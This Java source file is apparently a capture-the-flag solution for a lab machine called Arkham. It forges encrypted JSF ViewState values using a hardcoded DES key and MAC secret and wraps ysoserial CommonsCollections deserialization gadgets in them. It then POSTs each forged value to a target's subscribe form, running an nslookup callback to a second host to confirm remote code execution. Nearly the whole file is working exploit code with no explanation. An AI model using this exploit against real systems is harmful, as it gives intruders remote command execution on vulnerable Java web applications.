package arkham;

import java.io.BufferedReader;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.io.OutputStreamWriter;
import java.io.UnsupportedEncodingException;
import java.net.URL;
import java.net.URLConnection;
import java.net.URLDecoder;
import java.net.URLEncoder;
import java.security.AccessController;
import java.security.PrivilegedActionException;
import java.security.PrivilegedExceptionAction;
import java.util.Base64;
import java.util.logging.Level;
import java.util.logging.Logger;
import java.util.zip.GZIPOutputStream;

import javax.crypto.Cipher;
import javax.crypto.Mac;
import javax.crypto.SecretKey;
import javax.crypto.spec.IvParameterSpec;
import javax.crypto.spec.SecretKeySpec;
import ysoserial.payloads.*;
import ysoserial.payloads.util.CmdExecuteHelper;

//import javax.faces.FacesException;
//import javax.faces.application.ViewExpiredException;


public class StateUtils{
    private static final Logger log = Logger.getLogger(StateUtils.class.getName());
    //Cambio por HmacSHA1
    public static final String macAlgorithm = "HmacSHA1";
    //Cambio por MAC_SECRET -> SnNGOTg3Ni0=
    public static final String INIT_MAC_SECRET = "MAC_SECRET";
    public static final String INIT_MAC_SECRET_KEY_CACHE = "org.apache.myfaces.MAC_SECRET.CACHE";
    //configuracion Local encrypt/decrypt
    private static final String encodedKey ="SnNGOTg3Ni0=";        
    private static final byte[] decodedKey = decode(encodedKey.getBytes());
    private static final SecretKey secretKey = new SecretKeySpec(decodedKey,"DES");    
    //configuracion Local encrypt/decrypt
    private static final String macSecretStr = "SnNGOTg3Ni0=";
    private static final byte[] macSecretBytes = decode(macSecretStr.getBytes());
    private static final SecretKey macSecretKey = new SecretKeySpec(macSecretBytes, macAlgorithm);    
    private static final String ZIP_CHARSET = "ISO-8859-1";
    // String DEFAULT_ALGORITHM = "DES";
    private static final String algorithm = "DES";
    // String DEFAULT_ALGORITHM_PARAMS = "ECB/PKCS5Padding";
    private static final String algorithmParams = "ECB/PKCS5Padding";
    private static final byte[] iv = null;
    
    StateUtils(){
        //nope
    }

    public static final String construct(Object object)   {
        byte[] bytes = getAsByteArray(object);
        bytes = encrypt(bytes);
        bytes = encode(bytes);
        try{
            String value = new String(bytes, ZIP_CHARSET);            
            String payload = URLEncoder.encode(value, ZIP_CHARSET);
            //System.out.println("Encrypted: "+payload);
            return payload;
            
        }catch (UnsupportedEncodingException e){
            System.out.println("Exeption: "+e);
            return null;
            //throw new FacesException(e);
        }
    }
    
    public static final byte[] getAsByteArray(Object object){
        ByteArrayOutputStream outputStream = new ByteArrayOutputStream();
        
        try{
            ObjectOutputStream writer = new ObjectOutputStream(outputStream);            
            writer.writeObject(object);
            byte[] bytes = outputStream.toByteArray();
            writer.close();
            outputStream.close();
            writer = null;
            outputStream = null;
            return bytes;
        }catch (IOException e){
            System.out.println("Exception: "+e);
            return null;
            //throw new FacesException(e);
        }
    }

    public static byte[] encrypt(byte[] insecure){
        try{
            // keep local to avoid threading issue
            Mac mac = Mac.getInstance(macAlgorithm);
            mac.init(macSecretKey);
            Cipher cipher = Cipher.getInstance(algorithm + '/' + algorithmParams);
            if (iv != null){
                IvParameterSpec ivSpec = new IvParameterSpec(iv);
                cipher.init(Cipher.ENCRYPT_MODE, secretKey, ivSpec);
            }else{
                cipher.init(Cipher.ENCRYPT_MODE, secretKey);
            }            
            //EtM Composition Approach
            int macLenght = mac.getMacLength();
            byte[] secure = new byte[cipher.getOutputSize(insecure.length)+ macLenght];
            int secureCount = cipher.doFinal(insecure,0,insecure.length,secure);
            mac.update(secure, 0, secureCount);
            mac.doFinal(secure, secureCount);

            return secure;
        }catch (Exception e){
            System.out.println(e);
            return null;
        }
    }

    public static final byte[] compress(byte[] bytes){
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        try{
            GZIPOutputStream gzip = new GZIPOutputStream(baos);
            gzip.write(bytes, 0, bytes.length);
            gzip.finish();
            byte[] fewerBytes = baos.toByteArray();
            gzip.close();
            baos.close();
            gzip = null;
            baos = null;
            return fewerBytes;
        }catch (IOException e){
            System.out.println("Exception: "+e);
            return null;
            //throw new FacesException(e);
        }
    }

    public static final byte[] encode(byte[] bytes){
        return Base64.getEncoder().encode(bytes);
    }

    public static final Object reconstruct(String string){
        byte[] bytes;
        try{
            if(log.isLoggable(Level.FINE)){
                log.fine("Processing state : " + string);
            }
            System.out.println("Processing state : " + string);

            String _tmp = string;
            if (string.contains("%")) {
                _tmp = URLDecoder.decode(string, ZIP_CHARSET);
            }
            bytes = _tmp.getBytes(ZIP_CHARSET);
            bytes = decode(bytes);
            bytes = decrypt(bytes);

            return getAsObject(bytes);
            
            /*bytes = string.getBytes(ZIP_CHARSET);
            bytes = decode(bytes);
            System.out.println("STATE: "+bytes);
            String test = new String(bytes);
            System.out.println("STATE - STRING: "+ test);
            //bytes = decompress(bytes);
            bytes = decrypt(bytes);
            /*if(isSecure(ctx))
            {
                bytes = decrypt(bytes);
            }
            if( enableCompression(ctx) )
            {
                bytes = decompress(bytes);
            }
            return getAsObject(bytes);*/
        }catch (Throwable e){
            if (log.isLoggable(Level.FINE)){
                System.out.println(Level.FINE+ "View State cannot be reconstructed"+ e);
                log.log(Level.FINE, "View State cannot be reconstructed", e);
            }            
            System.out.println(e);
            return null;
        }
    }

    public static final byte[] decode(byte[] bytes){
        System.out.println("Decode..");
        return Base64.getDecoder().decode(bytes);
    }

    public static byte[] decrypt(byte[] secure){
        //String algorithm = DEFAULT_ALGORITHM;           
        //String algorithmParams  =DEFAULT_ALGORITHM_PARAMS;        
        //String macAlgorithm = macAlgorithm;

        try{
            // keep local to avoid threading issue
            Mac mac = Mac.getInstance(macAlgorithm);
            mac.init(macSecretKey);
            Cipher cipher = Cipher.getInstance(algorithm + '/'
                    + algorithmParams);
            if (iv != null){
                IvParameterSpec ivSpec = new IvParameterSpec(iv);
                cipher.init(Cipher.DECRYPT_MODE, secretKey, ivSpec);
            }else{
                cipher.init(Cipher.DECRYPT_MODE, secretKey);
            }
            
            if (log.isLoggable(Level.FINE)) {
                log.fine("decrypting w/ " + algorithm + '/' + algorithmParams);
            }

            //EtM Composition Approach
            int macLenght = mac.getMacLength();
            mac.update(secure, 0, secure.length-macLenght);
            byte[] signedDigestHash = mac.doFinal();

            boolean isMacEqual = true;
            for (int i = 0; i < signedDigestHash.length; i++)
            {
                if (signedDigestHash[i] != secure[secure.length-macLenght+i])
                {
                    isMacEqual = false;
                }
            }
            if (!isMacEqual){
                System.out.println("Exception: Error");
                return null;
                //throw new ViewExpiredException();
            }
            
            return cipher.doFinal(secure, 0, secure.length-macLenght);
        }
        catch (Exception e){
            System.out.println("Exception: "+e);
            return null;
            //throw new FacesException(e);
        }
    }
    
    public static Object getAsObject(byte[] bytes){
        ByteArrayInputStream input = null;
        try{
            input = new ByteArrayInputStream(bytes);

            // get the Factory that was instantiated @ startup
            //SerialFactory serialFactory = (SerialFactory) ctx.getApplicationMap().get(SERIAL_FACTORY);
            //Assert.notNull(serialFactory, "serialFactory");

            ObjectInputStream s = null;
            Exception pendingException = null;
            try{
                //s = serialFactory.getObjectInputStream(input); 
                Object object = null;
                if (System.getSecurityManager() != null){
                    final ObjectInputStream ois = s;
                    object = AccessController.doPrivileged(new PrivilegedExceptionAction<Object>(){
                        public Object run() throws PrivilegedActionException,IOException, ClassNotFoundException{
                            return ois.readObject();
                        }
                    });
                }else{
                    object = s.readObject();
                }
                return object;
            }catch (Exception e){                
                pendingException = e;
                System.out.println("Exception: "+e);
                return null;
                //throw new FacesException(e);
            }finally{
                if (s != null){
                    try{
                        s.close();
                    }catch (IOException e){
                        if (pendingException == null){
                            System.out.println("Exception: "+e);
                            return null;
                            //throw new FacesException(e);
                        }                        
                    }finally{
                        s = null;
                    }
                }
            }
        }finally{
            if (input != null){
                try{
                    input.close();
                }catch (IOException e){
                    //ignore it, because ByteArrayInputStream.close has
                    //no effect, but it is better to call close and preserve
                    //semantic from previous code.
                }finally{
                    input = null;
                }
            }
        }
    }
    
    public static void sendPayload(String viewstate) throws IOException{
        String data = "j_id_jsp_1623871077_1:email=9&j_id_jsp_1623871077_1:submit=SIGN UP&j_id_jsp_1623871077_1_SUBMIT=1&javax.faces.ViewState=";
        data += viewstate;
        URL url = new URL("http://10.10.10.130:8080/userSubscribe.faces");
        URLConnection conn = url.openConnection();
        conn.setDoOutput(true);
        OutputStreamWriter wr = new OutputStreamWriter(conn.getOutputStream());
        wr.write(data);
        wr.flush();

        BufferedReader rd = new BufferedReader(new InputStreamReader(conn.getInputStream()));
        String line;
        while ((line = rd.readLine()) != null) {
          System.out.println(line);
        }
        wr.close();
        rd.close();
    }
    
    public static void main(String[] argv) throws IOException, InterruptedException{
        //Payloads
        String[] payload_list = {"CommonsCollections1","CommonsCollections2","CommonsCollections3","CommonsCollections4","CommonsCollections5","CommonsCollections6"};        
        //Generate payload
        for (String payload: payload_list) {
            System.out.println("\nPayload: "+payload);
            String cmd = String.format("nslookup %s 10.10.12.97",payload);
            //https://github.com/pimps/ysoserial-modified/blob/master/src/main/java/ysoserial/payloads/util/CmdExecuteHelper.java
            //ysoserial-modified.jar -> command
            CmdExecuteHelper cmand = new CmdExecuteHelper("cmd",cmd);
            //Ysoserial.jar - Object payloadObject = ObjectPayload.Utils.makePayloadObject(payload,cmd); -> command
            Object payloadObject = ObjectPayload.Utils.makePayloadObject(payload,cmand);
            String viewstatePayload = construct(payloadObject);
            System.out.println(viewstatePayload);                     
            try{
                sendPayload(viewstatePayload);
            }catch (Exception e){
                System.out.println("Exeption: "+e);
            }finally{
                assert true;
            }
            Thread.sleep(1000);
            //javac -cp jar file.java
            //java -cp jar file
        }
        if (argv.length > 0) {
            System.out.println(argv[0]);
        }
    }
    
    
 
}

